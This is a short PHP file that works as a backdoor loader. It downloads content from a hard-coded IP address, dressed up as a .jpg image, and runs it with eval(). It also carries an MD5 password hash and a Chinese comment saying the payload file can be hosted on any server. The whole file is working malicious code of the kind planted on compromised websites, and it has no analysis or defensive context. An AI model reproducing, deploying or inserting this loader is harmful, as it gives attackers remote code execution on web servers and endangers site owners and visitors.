<?php
$password = "21232f297a57a5a743894a0e4a801fc3"; //Viv, bebegim..
function s(){
	$contents = file_get_contents('http://45.123.101.251:5520/123.jpg');
	a($contents);
}
function a($conn){
	$b = '';
	eval($b.$conn.$b);
}
s();
//    a.gif可以放在任何服务器上调用。
?>